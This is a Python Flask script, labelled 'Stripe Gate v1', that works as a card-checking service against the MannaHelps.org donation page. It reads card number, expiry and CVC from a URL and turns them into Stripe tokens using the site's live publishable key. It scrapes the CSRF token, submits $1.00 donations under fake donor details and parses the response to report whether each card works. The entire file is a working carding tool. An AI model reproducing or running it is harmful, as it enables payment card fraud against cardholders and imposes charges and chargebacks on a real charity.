import requests
import json
import re
from urllib.parse import unquote
from flask import Flask, request, jsonify

app = Flask(__name__)

# Persistent session to maintain cookies
session = requests.Session()

def log_final_response(response):
    try:
        # 1. Try JSON first
        try:
            response_json = response.json()
        except json.JSONDecodeError:
            response_json = None

        if response_json:
            if 'error' in response_json:
                err = response_json['error']
                code = err.get('code', '')
                msg  = err.get('message', '')
            else:
                code = ''
                msg  = response_json
        else:
            # 2. HTML fallback – clean the noisy output
            text = response.text

            # Remove the noisy prefix that sometimes appears
            text = re.sub(r'[\r\n]+Param is:[\r\n]+', ' ', text, flags=re.I)

            # Extract Code / Message
            code_match = re.search(r'Code\s*is:\s*([^\n<]+)', text, re.I)
            msg_match  = re.search(r'Message\s*is:\s*([^\n<]+)', text, re.I)

            code = code_match.group(1).strip() if code_match else ''
            msg  = msg_match.group(1).strip() if msg_match else 'Unknown error'

        # Build clean result
        result = {
            "error_code": code,
            "response": {
                "code": code,
                "message": msg
            }
        }

    except Exception as e:
        result = {
            "error_code": "parse_error",
            "response": {
                "code": "parse_error",
                "message": f"Failed to parse response: {str(e)}"
            }
        }

    print(json.dumps(result, indent=2))
    return result

def get_csrf_token():
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'referer': 'https://www.mannahelps.org/donate/food/',
        'upgrade-insecure-requests': '1',
    }
    try:
        resp = session.get('https://www.mannahelps.org/donate/money/', headers=headers, timeout=15)
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        return match.group(1) if match else None
    except:
        return None

def create_stripe_token(cc, mm, yy, cvc):
    # Normalize year
    if len(yy) == 2:
        yy = '20' + yy

    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
    }

    data = (
        f'key=pk_live_7EhDaYyXbPLKSk9IhDTiU0Kr'
        f'&payment_user_agent=stripe.js%2F78ef418'
        f'&card[number]={cc}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&card[cvc]={cvc}'
        f'&card[name]=Test+User'
        f'&card[address_line1]=123+Main+St'
        f'&card[address_city]=Miami'
        f'&card[address_state]=FL'
        f'&card[address_zip]=33101'
        f'&time_on_page=12345'
    )

    try:
        resp = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data, timeout=20)
        token_data = resp.json()
        return token_data.get('id'), None
    except Exception as e:
        return None, f"Stripe error: {str(e)}"

def submit_donation(stripe_token):
    csrf_token = get_csrf_token()
    if not csrf_token:
        return {
            "error_code": "csrf_failed",
            "response": {"code": "csrf_failed", "message": "Could not retrieve CSRF token"}
        }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.mannahelps.org',
        'referer': 'https://www.mannahelps.org/donate/money/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36',
        'upgrade-insecure-requests': '1',
    }

    data = [
        ('account', 'Programs/Services'),
        ('amount', 'other'),
        ('amnto-text', '1'),
        ('name', 'Test User'),
        ('email', 'test@example.com'),
        ('comfirmAddress', 'test@example.com'),
        ('phone', '5551234567'),
        ('address_line1', '123 Main St'),
        ('address_city', 'Miami'),
        ('address_state', 'FL'),
        ('address_zip', '33101'),
        ('formID', 'donate'),
        ('csrf_token', csrf_token),
        ('id', 'Manna Donation'),
        ('itemInfo', 'One-Time Donation'),
        ('interval', '1'),
        ('amountInput', '1.00'),
        ('id', 'Payment'),
        ('utm_source', 'null'),
        ('utm_medium', 'null'),
        ('utm_campaign', 'null'),
        ('gclid', 'null'),
        ('stripeToken', stripe_token),
    ]

    try:
        resp = session.post('https://www.mannahelps.org/checkout/payment.php', headers=headers, data=data, timeout=30)
        return log_final_response(resp)
    except Exception as e:
        return {
            "error_code": "submit_error",
            "response": {"code": "submit_error", "message": str(e)}
        }

@app.route('/gate=stripe1$/cc=<path:card>', methods=['GET'])
def stripe_gate(card):
    try:
        decoded = unquote(card)
        parts = [p.strip() for p in decoded.split('|')]

        if len(parts) != 4:
            return jsonify({
                "error_code": "invalid_format",
                "response": {
                    "code": "invalid_format",
                    "message": "Format: cc|mm|yy|cvc (4 fields)"
                }
            }), 400

        cc, mm, yy, cvc = parts

        # Validate basic format
        if not (cc.isdigit() and len(cc) >= 13 and len(cc) <= 19):
            return jsonify({"error_code": "invalid_cc", "response": {"code": "invalid_cc", "message": "Invalid card number"}}), 400
        if not (mm.isdigit() and 1 <= int(mm) <= 12):
            return jsonify({"error_code": "invalid_mm", "response": {"code": "invalid_mm", "message": "Invalid month"}}), 400
        if not (yy.isdigit() and len(yy) in [2, 4]):
            return jsonify({"error_code": "invalid_yy", "response": {"code": "invalid_yy", "message": "Invalid year"}}), 400
        if not (cvc.isdigit() and len(cvc) in [3, 4]):
            return jsonify({"error_code": "invalid_cvc", "response": {"code": "invalid_cvc", "message": "Invalid CVC"}}), 400

        # Create token
        token, err = create_stripe_token(cc, mm, yy, cvc)
        if not token:
            return jsonify({
                "error_code": "token_failed",
                "response": {"code": "token_failed", "message": err or "Stripe token creation failed"}
            }), 400

        # Submit donation
        result = submit_donation(token)
        return jsonify(result), 200

    except Exception as e:
        return jsonify({
            "error_code": "server_error",
            "response": {"code": "server_error", "message": f"Server error: {str(e)}"}
        }), 500

@app.route('/')
def home():
    return """
    <h2>Stripe Gate v1 - MannaHelps.org</h2>
    <p><b>Endpoint:</b> <code>/gate=stripe1$/cc=4111111111111111|12|25|123</code></p>
    <p>Format: <code>cc|mm|yy|cvc</code> (yy = 2 or 4 digits)</p>
    <p>Charges $1.00</p>
    """

if __name__ == '__main__':
    print("Stripe Gate Server Running")
    print("→ http://127.0.0.1:5000/gate=stripe1$/cc=4111111111111111|12|25|123")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
